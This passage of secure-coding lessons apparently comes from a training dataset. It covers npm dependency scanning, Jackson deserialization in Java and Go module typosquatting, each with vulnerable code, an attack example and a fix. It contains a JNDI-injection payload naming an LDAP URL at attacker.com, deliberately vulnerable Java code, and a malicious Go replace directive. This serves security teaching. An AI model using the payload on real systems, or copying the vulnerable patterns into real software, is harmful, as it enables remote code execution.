// node scripts/dependency-policy.js
```

2. **CI/CD Gates with Multiple Scanners**:
```javascript
// Use multiple tools for comprehensive coverage
const scanners = [
  'npm audit',                    // Built-in, catches known CVEs
  'snyk test',                    // Commercial DB, finds more issues
  'npx socket-security/cli',      // Detects supply chain attacks
  'npx better-npm-audit audit'    // Enhanced npm audit
];
```

3. **Runtime Dependency Monitoring**:
```javascript
// Monitor for runtime dependency issues
const { createRequire } = require('module');
const originalRequire = createRequire(module.filename);

// Log all require calls in production for audit
if (process.env.NODE_ENV === 'production') {
  const Module = require('module');
  const originalLoad = Module._load;

  Module._load = function(request, parent) {
    console.log(`[REQUIRE] ${request} from ${parent?.filename || 'root'}`);
    return originalLoad.apply(this, arguments);
  };
}
```

**Additional Protections**:
- **Dependabot/Renovate**: Automated PRs for dependency updates with security priority
- **Private npm registry**: Use Artifactory/Nexus to proxy and scan packages before allowing
- **Lockfile-lint**: Validate lockfile integrity and detect registry tampering
- **SBOM generation**: Create Software Bill of Materials for supply chain transparency
- **npm provenance**: Verify package build provenance with npm's sigstore integration
- **Socket.dev integration**: Real-time detection of supply chain attacks and typosquatting

JSON parsing in Java requires careful attention to the library version and configuration. Using outdated or misconfigured JSON libraries is one of the most common attack vectors in Java applications.

**VULNERABLE CODE**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import javax.servlet.http.*;
import java.io.IOException;

public class UserApiController extends HttpServlet {
    // Using Jackson 2.9.8 or earlier with dangerous defaults
    private static final ObjectMapper mapper = new ObjectMapper();

    static {
        // DANGEROUS: Enabling default typing allows polymorphic deserialization
        mapper.enableDefaultTyping();
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        // Directly deserialize untrusted input
        String jsonInput = request.getReader().lines()
            .reduce("", (acc, line) -> acc + line);

        // VULNERABLE: No validation, dangerous typing enabled
        Object userData = mapper.readValue(jsonInput, Object.class);

        response.setContentType("application/json");
        response.getWriter().write(mapper.writeValueAsString(userData));
    }
}
```

**Attack Payload**:
```json
[
  "com.sun.rowset.JdbcRowSetImpl",
  {
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
  }
]
```

**Why This Is Dangerous**:
- `enableDefaultTyping()` allows attackers to specify arbitrary class names in JSON
- Jackson will instantiate any class on the classpath during deserialization
- Gadget chains like `JdbcRowSetImpl` can trigger JNDI injection leading to RCE
- Older Jackson versions have hundreds of known gadget classes in their blocklist

**SECURE VERSION**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.json.JsonMapper;
import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonProperty;
import javax.servlet.http.*;
import java.io.IOException;

public class UserApiController extends HttpServlet {
    // Use latest Jackson version (2.16.x as of 2024)
    private static final ObjectMapper mapper = JsonMapper.builder()
        // SECURE: Disable dangerous features
        .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
        .build();

    // Strongly-typed DTO prevents arbitrary class instantiation
    public static class UserRequest {
        private final String username;
        private final String email;

        @JsonCreator
        public UserRequest(
                @JsonProperty("username") String username,
                @JsonProperty("email") String email) {
            this.username = username;
            this.email = email;
        }

        public String getUsername() { return username; }
        public String getEmail() { return email; }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        try {
            // SECURE: Deserialize to specific type, not Object.class
            UserRequest userData = mapper.readValue(
                request.getInputStream(), 
                UserRequest.class
            );

            response.setContentType("application/json");
            response.getWriter().write(mapper.writeValueAsString(userData));
        } catch (Exception e) {
            response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
            response.getWriter().write("{\"error\":\"Invalid request\"}");
        }
    }
}
```

**Key Security Controls**:
- **Never use `enableDefaultTyping()`**: This is the root cause of most Jackson RCE vulnerabilities
- **Deserialize to concrete types**: Always use specific DTOs instead of `Object.class` or `Map<String, Object>`
- **Keep Jackson updated**: Use version 2.16.x or later which has comprehensive gadget blocklists
- **Use `JsonMapper.builder()`**: Modern builder pattern with secure defaults

Polymorphic deserialization is a legitimate requirement, but it must be implemented with an explicit allowlist. Never allow arbitrary type resolution from user input.

**PRODUCTION PATTERN**:

```java
import com.fasterxml.jackson.annotation.*;
import com.fasterxml.jackson.databind.*;
import com.fasterxml.jackson.databind.json.JsonMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import javax.servlet.http.*;
import java.io.IOException;
import java.util.Set;

public class SecureMessageController extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(SecureMessageController.class);
    private static final int MAX_PAYLOAD_SIZE = 65536; // 64KB limit

    // SECURE: Explicit allowlist for polymorphic types
    private static final PolymorphicTypeValidator TYPE_VALIDATOR = 
        BasicPolymorphicTypeValidator.builder()
            .allowIfBaseType(Message.class)  // Only allow Message subtypes
            .allowIfSubType("com.myapp.messages.")  // Only from our package
            .build();

    private static final ObjectMapper mapper = JsonMapper.builder()
        .activateDefaultTyping(TYPE_VALIDATOR, ObjectMapper.DefaultTyping.NON_FINAL)
        .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
        .build();

    // SECURE: Closed type hierarchy with annotation-based type info
    @JsonTypeInfo(
        use = JsonTypeInfo.Id.NAME,
        include = JsonTypeInfo.As.PROPERTY,
        property = "type",
        visible = true
    )
    @JsonSubTypes({
        @JsonSubTypes.Type(value = TextMessage.class, name = "text"),
        @JsonSubTypes.Type(value = ImageMessage.class, name = "image"),
        @JsonSubTypes.Type(value = FileMessage.class, name = "file")
    })
    public static abstract class Message {
        private String id;
        private long timestamp;

        public String getId() { return id; }
        public void setId(String id) { this.id = id; }
        public long getTimestamp() { return timestamp; }
        public void setTimestamp(long timestamp) { this.timestamp = timestamp; }

        public abstract String getType();
    }

    public static class TextMessage extends Message {
        private String content;

        @Override
        public String getType() { return "text"; }
        public String getContent() { return content; }
        public void setContent(String content) { this.content = content; }
    }

    public static class ImageMessage extends Message {
        private String imageUrl;
        private String altText;

        @Override
        public String getType() { return "image"; }
        public String getImageUrl() { return imageUrl; }
        public void setImageUrl(String imageUrl) { this.imageUrl = imageUrl; }
        public String getAltText() { return altText; }
        public void setAltText(String altText) { this.altText = altText; }
    }

    public static class FileMessage extends Message {
        private String filename;
        private long fileSize;

        @Override
        public String getType() { return "file"; }
        public String getFilename() { return filename; }
        public void setFilename(String filename) { this.filename = filename; }
        public long getFileSize() { return fileSize; }
        public void setFileSize(long fileSize) { this.fileSize = fileSize; }
    }

    // Allowed type names for validation
    private static final Set<String> ALLOWED_TYPES = Set.of("text", "image", "file");

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        String clientIP = request.getRemoteAddr();

        try {
            // DEFENSE 1: Size limit prevents DoS
            if (request.getContentLength() > MAX_PAYLOAD_SIZE) {
                logger.warn("Payload size exceeded from IP: {}", clientIP);
                sendError(response, HttpServletResponse.SC_REQUEST_ENTITY_TOO_LARGE, 
                         "Payload too large");
                return;
            }

            // DEFENSE 2: Content-Type validation
            String contentType = request.getContentType();
            if (contentType == null || !contentType.contains("application/json")) {
                logger.warn("Invalid content type from IP: {}: {}", clientIP, contentType);
                sendError(response, HttpServletResponse.SC_UNSUPPORTED_MEDIA_TYPE, 
                         "Content-Type must be application/json");
                return;
            }

            // DEFENSE 3: Deserialize with type validator
            Message message = mapper.readValue(request.getInputStream(), Message.class);

            // DEFENSE 4: Additional business validation
            if (!ALLOWED_TYPES.contains(message.getType())) {
                logger.warn("Unknown message type from IP: {}: {}", clientIP, message.getType());
                sendError(response, HttpServletResponse.SC_BAD_REQUEST, "Invalid message type");
                return;
            }

            // Audit log for security monitoring
            logger.info("Message received - type: {}, id: {}, from: {}", 
                       message.getType(), message.getId(), clientIP);

            // Process message...
            response.setContentType("application/json");
            response.getWriter().write("{\"status\":\"received\"}");

        } catch (JsonProcessingException e) {
            logger.error("JSON parsing error from IP: {}: {}", clientIP, e.getMessage());
            sendError(response, HttpServletResponse.SC_BAD_REQUEST, "Invalid JSON");
        } catch (Exception e) {
            logger.error("Unexpected error processing message from IP: {}", clientIP, e);
            sendError(response, HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "Processing error");
        }
    }

    private void sendError(HttpServletResponse response, int status, String message) 
            throws IOException {
        response.setStatus(status);
        response.setContentType("application/json");
        response.getWriter().write("{\"error\":\"" + message + "\"}");
    }
}
```

**Defense in Depth Layers**:

1. **PolymorphicTypeValidator allowlist**:
```java
// Only classes extending Message and in our package are allowed
BasicPolymorphicTypeValidator.builder()
    .allowIfBaseType(Message.class)
    .allowIfSubType("com.myapp.messages.")
    .build();
```

2. **Annotation-based closed type hierarchy**:
```java
// @JsonSubTypes explicitly lists all allowed subtypes
@JsonSubTypes({
    @JsonSubTypes.Type(value = TextMessage.class, name = "text"),
    // Attacker cannot add new types at runtime
})
```

3. **Dependency management with version pinning**:
```xml
<!-- pom.xml: Always use latest stable Jackson -->
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.16.1</version>
</dependency>

<!-- Use OWASP Dependency-Check in CI/CD -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.7</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
    </configuration>
</plugin>
```

**Additional Protections**:
- **Automated dependency scanning**: Integrate Snyk, Dependabot, or OWASP Dependency-Check in CI/CD
- **Runtime monitoring**: Use RASP solutions to detect deserialization attacks
- **Network egress filtering**: Block outbound LDAP/RMI to prevent JNDI injection exploitation
- **JVM hardening**: Use `-Dcom.sun.jndi.ldap.object.trustURLCodebase=false` and `-Dcom.sun.jndi.rmi.object.trustURLCodebase=false`
- **Regular updates**: Subscribe to Jackson security advisories and update within 72 hours of critical CVEs

Dependency management in Go requires vigilance against supply chain attacks. In 2023, multiple Go modules were compromised through typosquatting and dependency confusion attacks, leading to credential theft and cryptominer installations.

**VULNERABLE CODE**:

```go
package main

import (
	"fmt"
	// DANGEROUS: Typosquatted package name (notice the subtle misspelling)
	"github.com/tidwali/gjson" // Should be tidwall/gjson
)

// go.mod with no verification
// module myapp
// go 1.21
// require github.com/tidwali/gjson v1.14.4

func main() {
	jsonData := `{"name": "John", "age": 30}`

	// Using potentially malicious package
	name := gjson.Get(jsonData, "name")
	fmt.Printf("Name: %s\n", name.String())
}

// Another dangerous pattern: using replace directive carelessly
// go.mod
// replace github.com/internal/auth => github.com/attacker/auth v0.0.1
```

**Attack Scenario**:
```bash
# Attacker registers typosquatted module
go mod init github.com/tidwali/gjson  # Note: 'tidwali' vs 'tidwall'

# Victim accidentally types wrong name
go get github.com/tidwali/gjson@latest

# Malicious init() function executes during import
# Steals environment variables, SSH keys, cloud credentials
```

**Why This Is Dangerous**:
- Typosquatting exploits human error in typing package names
- Go automatically fetches from public proxy without verification
- Malicious init() functions execute immediately on import
- No checksum verification for new dependencies by default
- Replace directives can redirect to attacker-controlled modules

**SECURE VERSION**:

```go
package main

import (
	"fmt"
	"log"

	// SECURE: Verified package from trusted source
	"github.com/tidwall/gjson"
)

// go.mod with checksum verification
// module myapp
// go 1.21
// require github.com/tidwall/gjson v1.17.0

// go.sum (auto-generated, commit to version control)
// github.com/tidwall/gjson v1.17.0 h1:/Jocvlh98kcTfpN2+JzGQWQcqrPQwDrVEMApx/M5ZwM=
// github.com/tidwall/gjson v1.17.0/go.mod h1:/wbyibRr2FHMks5tjHJ5F8dMZh3AcwJEMf5vlfC0lxk=

func main() {
	// Verify module is from expected source
	jsonData := `{"name": "John", "age": 30}`

	// Safe: Using verified, checksummed dependency
	result := gjson.Get(jsonData, "name")
	if !result.Exists() {
		log.Fatal("JSON field not found")
	}

	fmt.Printf("Name: %s\n", result.String())
}
```

**go.mod with security controls**:
```go
module myapp

go 1.21

require github.com/tidwall/gjson v1.17.0

// SECURITY: Pin exact versions, never use 'latest'
// SECURITY: go.sum file provides cryptographic verification
// SECURITY: Run 'go mod verify' in CI/CD pipeline
```

**Key Security Controls**:
- **Exact version pinning**: Always specify exact versions, never use `@latest` in production
- **Checksum verification**: Commit `go.sum` to version control and enable GOSUMDB
- **Source verification**: Double-check package paths against official documentation
- **Vulnerability scanning**: Integrate `govulncheck` into CI/CD pipeline

Private module protection is critical. The 2021-2023 dependency confusion attacks exploited organizations by registering internal package names on public registries, causing build systems to fetch malicious public packages instead of private ones.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

// DependencyVerifier provides secure dependency management
type DependencyVerifier struct {
	allowedDomains    []string
	privateDomains    []string
	knownChecksums    map[string]string
	logger            *slog.Logger
	goproxy           string
	goprivate         string
	gonosumdb         string
}

// NewDependencyVerifier creates a configured verifier
func NewDependencyVerifier(logger *slog.Logger) *DependencyVerifier {
	return &DependencyVerifier{
		// SECURITY: Whitelist of trusted module sources
		allowedDomains: []string{
			"github.com",
			"golang.org",
			"google.golang.org",
			"gopkg.in",
		},
		// SECURITY: Private domains that must NOT go through public proxy
		privateDomains: []string{
			"git.internal.company.com",
			"gitlab.company.com",
			"company.com/go",
		},
		knownChecksums: make(map[string]string),
		logger:         logger,
		// SECURITY: Use private proxy for all modules
		goproxy:   "https://goproxy.internal.company.com,direct",
		// SECURITY: Mark private domains to bypass public checksum DB
		goprivate: "git.internal.company.com/*,gitlab.company.com/*,company.com/go/*",
		// SECURITY: Don't send private module names to public sumdb
		gonosumdb: "git.internal.company.com/*,gitlab.company.com/*,company.com/go/*",
	}
}

// ConfigureEnvironment sets up secure Go module environment
func (dv *DependencyVerifier) ConfigureEnvironment() error {
	// SECURITY: Configure GOPROXY to use private proxy first
	if err := os.Setenv("GOPROXY", dv.goproxy); err != nil {
		return fmt.Errorf("failed to set GOPROXY: %w", err)
	}

	// SECURITY: Mark private modules to prevent public fetching
	if err := os.Setenv("GOPRIVATE", dv.goprivate); err != nil {
		return fmt.Errorf("failed to set GOPRIVATE: %w", err)
	}

	// SECURITY: Prevent private module names from leaking to public sumdb
	if err := os.Setenv("GONOSUMDB", dv.gonosumdb); err != nil {
		return fmt.Errorf("failed to set GONOSUMDB: %w", err)
	}

	// SECURITY: Enable checksum database for public modules
	if err := os.Setenv("GOSUMDB", "sum.golang.org"); err != nil {
		return fmt.Errorf("failed to set GOSUMDB: %w", err)
	}

	dv.logger.Info("Go module environment configured securely",
		"goproxy", dv.goproxy,
		"goprivate", dv.goprivate,
	)

	return nil
}

// ValidateModulePath checks if a module path is from a trusted source
func (dv *DependencyVerifier) ValidateModulePath(modulePath string) error {
	// Check if it's a private module
	for _, private := range dv.privateDomains {
		if strings.HasPrefix(modulePath, private) {
			dv.logger.Debug("Private module detected", "module", modulePath)
			return nil
		}
	}

	// Check against allowed public domains
	allowed := false
	for _, domain := range dv.allowedDomains {
		if strings.HasPrefix(modulePath, domain) {
			allowed = true
			break
		}
	}

	if !allowed {
		dv.logger.Warn("Module from untrusted source",
			"module", modulePath,
			"allowed_domains", dv.allowedDomains,
		)
		return fmt.Errorf("module %s is not from a trusted source", modulePath)
	}

	// SECURITY: Check for typosquatting patterns
	if err := dv.checkTyposquatting(modulePath); err != nil {
		return err
	}

	return nil
}

// checkTyposquatting detects common typosquatting patterns
func (dv *DependencyVerifier) checkTyposquatting(modulePath string) error {
	// Known popular packages and their typosquats
	typosquatPatterns := map[string][]string{
		"github.com/tidwall/gjson":  {"tidwali", "tidwa11", "tidwaII"},
		"github.com/gin-gonic/gin":  {"gin-gonlc", "gln-gonic"},
		"github.com/gorilla/mux":    {"gorllla", "gor1lla"},
		"github.com/sirupsen/logrus": {"slrupsen", "sirupson"},
	}

	for legitimate, typos := range typosquatPatterns {
		for _, typo := range typos {
			if strings.Contains(modulePath, typo) {
				dv.logger.Error("Potential typosquatting detected",
					"suspicious_module", modulePath,
					"legitimate_module", legitimate,
					"matched_typo", typo,
				)
				return fmt.Errorf("potential typosquatting: %s looks like %s", modulePath, legitimate)
			}
		}
	}

	return nil
}

// VerifyModuleChecksum verifies a module against known checksums
func (dv *DependencyVerifier) VerifyModuleChecksum(ctx context.Context, modulePath, version string) error {
	// Run go mod verify
	cmd := exec.CommandContext(ctx, "go", "mod", "verify")
	output, err := cmd.CombinedOutput()
	if err != nil {
		dv.logger.Error("Module verification failed",
			"error", err,
			"output", string(output),
		)
		return fmt.Errorf("module verification failed: %w", err)
	}

	dv.logger.Info("Module checksums verified successfully")
	return nil
}

// ScanVulnerabilities runs govulncheck on the project
func (dv *DependencyVerifier) ScanVulnerabilities(ctx context.Context) ([]VulnerabilityReport, error) {
	cmd := exec.CommandContext(ctx, "govulncheck", "-json", "./...")
	output, err := cmd.CombinedOutput()
	if err != nil {
		// govulncheck exits with non-zero if vulnerabilities found
		dv.logger.Warn("Vulnerabilities may have been found",
			"output", string(output),
		)
	}

	// Parse and return vulnerability reports
	// In production, parse JSON output properly
	return []VulnerabilityReport{}, nil
}

type VulnerabilityReport struct {
	Module      string `json:"module"`
	Version     string `json:"version"`
	VulnID      string `json:"vuln_id"`
	Description string `json:"description"`
	Severity    string `json:"severity"`
	FixVersion  string `json:"fix_version"`
}

// AuditGoMod analyzes go.mod for security issues
func (dv *DependencyVerifier) AuditGoMod(goModPath string) error {
	content, err := os.ReadFile(goModPath)
	if err != nil {
		return fmt.Errorf("failed to read go.mod: %w", err)
	}

	lines := strings.Split(string(content), "\n")
	var issues []string

	for i, line := range lines {
		line = strings.TrimSpace(line)

		// SECURITY: Check for dangerous replace directives
		if strings.HasPrefix(line, "replace") {
			// Flag external replacements
			if strings.Contains(line, "=>") && !strings.Contains(line, "../") {
				issues = append(issues, fmt.Sprintf("line %d: external replace directive found: %s", i+1, line))
			}
		}

		// SECURITY: Check for 'latest' version
		if strings.Contains(line, "@latest") {
			issues = append(issues, fmt.Sprintf("line %d: '@latest' version tag is insecure: %s", i+1, line))
		}

		// SECURITY: Check for pseudo-versions (can indicate unreleased/suspicious code)
		if strings.Contains(line, "-0.") && strings.Contains(line, "-") {
			dv.logger.Warn("Pseudo-version detected, verify source",
				"line", i+1,
				"content", line,
			)
		}
	}

	if len(issues) > 0 {
		for _, issue := range issues {
			dv.logger.Error("go.mod security issue", "issue", issue)
		}
		return fmt.Errorf("found %d security issues in go.mod", len(issues))
	}

	return nil
}

func main() {
	logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
		Level: slog.LevelDebug,
	}))

	verifier := NewDependencyVerifier(logger)

	// Configure secure environment
	if err := verifier.ConfigureEnvironment(); err != nil {
		logger.Error("Failed to configure environment", "error", err)
		os.Exit(1)
	}

	ctx := context.Background()

	// Audit go.mod
	if err := verifier.AuditGoMod("go.mod"); err != nil {
		logger.Error("go.mod audit failed", "error", err)
		os.Exit(1)
	}

	// Verify checksums
	if err := verifier.VerifyModuleChecksum(ctx, "", ""); err != nil {
		logger.Error("Checksum verification failed", "error", err)
		os.Exit(1)
	}

	// Scan for vulnerabilities
	reports, err := verifier.ScanVulnerabilities(ctx)
	if err != nil {
		logger.Error("Vulnerability scan failed", "error", err)
	}

	if len(reports) > 0 {
		logger.Warn("Vulnerabilities found", "count", len(reports))
	}

	logger.Info("Dependency verification complete")
}
```

